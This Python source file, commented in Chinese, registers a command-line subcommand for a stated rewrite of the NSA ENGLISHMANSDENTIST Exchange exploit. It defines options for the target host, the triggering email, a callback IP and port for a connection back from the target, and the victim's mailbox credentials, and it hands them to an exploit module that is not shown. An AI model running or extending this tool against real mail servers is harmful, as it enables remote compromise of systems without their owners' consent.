"""englishmansdentist — ENGLISHMANSDENTIST Exchange IMAP/POP3/OWA 远程利用。

Python 重写的 NSA Englishmansdentist 工具 `Englishmansdentist-1.2.0.exe`
(C++ / DAVE framework)，通过 IDA Pro / x32dbg 逆向恢复。
实现了该工具的 key=value 参数接口及其 Exchange 利用流程。
"""

from . import englishmansdentist


# ---------------------------------------------------------------------------
# Subcommand entrypoint.
# ---------------------------------------------------------------------------
def englishmansdentist_handle(args):
    """Run the ENGLISHMANSDENTIST exploitation sequence against the supplied host."""
    return englishmansdentist.run_function(
        target=args.target,
        port=args.port,
        timeout=args.timeout,
        target_email_address=args.target_email_address,
        email_subject=args.email_subject,
        email_from_address=args.email_from_address,
        email_body=args.email_body,
        language=args.language,
        callback_ip=args.callback_ip,
        callback_port=args.callback_port,
        callback_local_port=args.callback_local_port,
        target_user_name=args.target_user_name,
        target_user_password=args.target_user_password,
        mail_check_protocol=args.mail_check_protocol,
        mail_check_port=args.mail_check_port,
        owamode=args.owamode,
        owadelay=args.owadelay,
        auth_code=args.auth_code,
        verbose=args.verbose,
    )


def reg_subparser(subparsers):
    """Register the `englishmansdentist` subcommand on an argparse
    subparsers group."""
    p = subparsers.add_parser(
        "englishmansdentist",
        help="ENGLISHMANSDENTIST Exchange IMAP/POP3/OWA 远程利用",
        description="Python 重写的 NSA Englishmansdentist (ENGLISHMANSDENTIST) "
                    "Exchange IMAP/POP3/OWA 远程利用工具 Englishmansdentist-1.2.0。"
                    "针对 Microsoft Exchange 服务器，通过邮件触发执行利用。",
    )
    p.add_argument(
        "target", metavar="TARGET",
        help="目标主机名或 IP",
    )
    p.add_argument(
        "-p", "--port", type=int, default=25,
        help="目标 SMTP 端口（默认 25）",
    )
    p.add_argument(
        "--timeout", type=int, default=60,
        help="阻塞网络调用超时秒（-1 表示无超时，默认 60）",
    )
    p.add_argument(
        "--target-email-address", metavar="EMAIL",
        help="目标邮箱地址",
    )
    p.add_argument(
        "--email-subject", metavar="SUBJ",
        help="邮件主题（建议唯一，用于后续删除）",
    )
    p.add_argument(
        "--email-from-address", metavar="FROM",
        help="邮件发件人地址",
    )
    p.add_argument(
        "--email-body", metavar="BODY",
        help="邮件正文",
    )
    p.add_argument(
        "--language",
        choices=["English", "German", "Korean", "Simplified_Chinese",
                 "Traditional_Chinese"],
        default="English",
        help="目标操作系统语言（默认 English）",
    )
    p.add_argument(
        "--callback-ip", metavar="IP",
        help="Callback 模式：目标连回的 IP 地址",
    )
    p.add_argument(
        "--callback-port", type=int, metavar="PORT",
        help="Callback 模式：目标连回的端口",
    )
    p.add_argument(
        "--callback-local-port", type=int, metavar="PORT",
        help="Callback 模式：本地监听端口",
    )
    p.add_argument(
        "--target-user-name", metavar="USER",
        help="目标邮箱账户用户名",
    )
    p.add_argument(
        "--target-user-password", metavar="PASS",
        help="目标邮箱账户密码",
    )
    p.add_argument(
        "--mail-check-protocol",
        choices=["POP3", "IMAP", "OWA"],
        default="POP3",
        help="邮件检查协议（默认 POP3）",
    )
    p.add_argument(
        "--mail-check-port", type=int, metavar="PORT",
        help="邮件检查端口（POP3 默认 110，IMAP 默认 143，OWA HTTP 默认 80，HTTPS 默认 443）",
    )
    p.add_argument(
        "--owamode",
        choices=["HTTP", "HTTPS"],
        default="HTTPS",
        help="OWA 模式（HTTP/HTTPS，仅在 OWA 模式下有效，默认 HTTPS）",
    )
    p.add_argument(
        "--owadelay", type=int, default=3000,
        help="OWA 模式：HTTP 请求间延迟毫秒（默认 3000）",
    )
    p.add_argument(
        "--auth-code", type=int, default=0,
        help="载荷认证码（默认 0）",
    )
    p.add_argument(
        "-v", "--verbose", action="store_true",
        help="输出参数与调试信息",
    )
    p.set_defaults(func=englishmansdentist_handle)
